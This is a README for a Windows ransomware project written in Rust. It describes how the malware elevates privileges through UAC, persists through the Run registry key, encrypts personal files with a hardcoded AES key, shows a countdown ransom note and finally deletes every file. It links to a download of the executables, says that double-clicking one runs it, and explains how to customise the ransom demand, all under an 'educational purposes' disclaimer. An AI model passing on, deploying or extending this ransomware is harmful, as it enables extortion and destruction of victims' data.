# Rust-Ransomware

## 1. What is this?


This is a Windows ransomware I wrote 100% in Rust. The GUI for the ransomnote is written in Python's tkinter because I am too lazy to code my GUI using WinAPI.


## 2. Overview of how it works


This ransomware first checks if this is the first time it's running by checking the existence of a file called **encrypt_date.txt**. If this file exists, then this is not the first time the malware is ran.


If the file does not exist, the malware starts the enryption process.


First, it checks for admin priviledges, and if the process does not have admin rights, it will attempt to elevate by asking the user's permission through UAC.


Second, after gaining admin priviledges, it will add itself to the registry ***Software\Microsoft\Windows\CurrentVersion\Run*** to maintain persistence after the machine reboots. Since this malware is ran every time the machine reboots, we need the file check above to know if we need to encrypt files or not.


Third, after adding itself to the registry, it will traverse and encrypt all personal files on the user's system and display the ransomnote. After encrypting, it will write the date into **encrypt_date.txt**. The files encrypted will have an extension of **.peter** at the end.


If the machine reboots and is already encrypted, it will just display the ransomnote. The ransomnote will display the countdown 1 month from the time in  **encrypt_date.txt**. Once the countdown is done, it will write *\x99\x99* into the file and restart the computer.


Whenever the **encrypt_date.txt** is read and the bytes returned are *\x99\x99*, all the files will be deleted.


## 3. How to install


Download the ransomware [here](https://github.com/cdong1012/Rust-Ransomware/releases/tag/1.0). Make sure that both the executables are in the same directory for it to work.


This ransomware does not required Internet access to work. Simply downloading and doubleclicking on the **Rust-Ransomware.exe** file are sufficient to run.


## 4. Component


1. Anti-reversing techniques


    I used most of the techniques found [here](https://github.com/ReddyyZ/DeathRansom)


2. Encryption


    In the [/src/encryption.rs](https://github.com/cdong1012/Rust-Ransomware/blob/master/src/encryption.rs), you can see how I use a hardcoded AES key to encrypt my files. 


    This is certainly not the best approach for encryption, so I will work on implementing a hybrid version between AES and RSA like how [WannaCry](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack) did.


## 5. Ransom Request


You can edit and change the ransom request in [ransomnote.py](https://github.com/cdong1012/Rust-Ransomware/blob/master/ransomnote.py), then compile it into an executable using [PyInstaller](https://www.pyinstaller.org/).


## 6. Test Run


[![Alt text](https://img.youtube.com/vi/zZBF3epBqRc/0.jpg)](https://www.youtube.com/watch?v=zZBF3epBqRc)


## 6. NOTE


This ransomware is only for educational purposes.


Please be considerate when installing and running this malware, as it can serious cause damage to the machine that you are running it on.


I coded this in to learn more about WinAPI and malware development, and I do not intend for anyone to use this for malicious purposes.


Therefore, I am not to be held responsible by anyone to any lost to damaged property as a result of using this malware.

